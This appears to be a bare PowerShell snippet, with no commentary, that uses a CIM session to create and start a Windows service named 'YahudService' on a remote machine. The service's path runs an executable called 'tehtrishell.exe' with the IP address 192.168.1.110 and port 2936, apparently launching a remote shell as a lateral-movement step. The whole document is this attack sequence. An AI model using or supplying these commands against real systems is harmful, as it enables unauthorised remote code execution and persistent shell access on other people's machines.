Invoke-CimMethod -CimSession $session -ClassName Win32_Service -MethodName Create -Arguments @{
Name = "YahudService";
DisplayName = "YahudService";
PathName = "C:\Windows\tehtrishell.exe 192.168.1.110 2936";
ServiceType = [byte]::Parse("16");
StartMode = "Manual";
}

$service = Get-CimInstance -CimSession $session -ClassName Win32_Service -filter "Name LIKE 'YahudService'"
Invoke-CimMethod -InputObject $service -MethodName StartService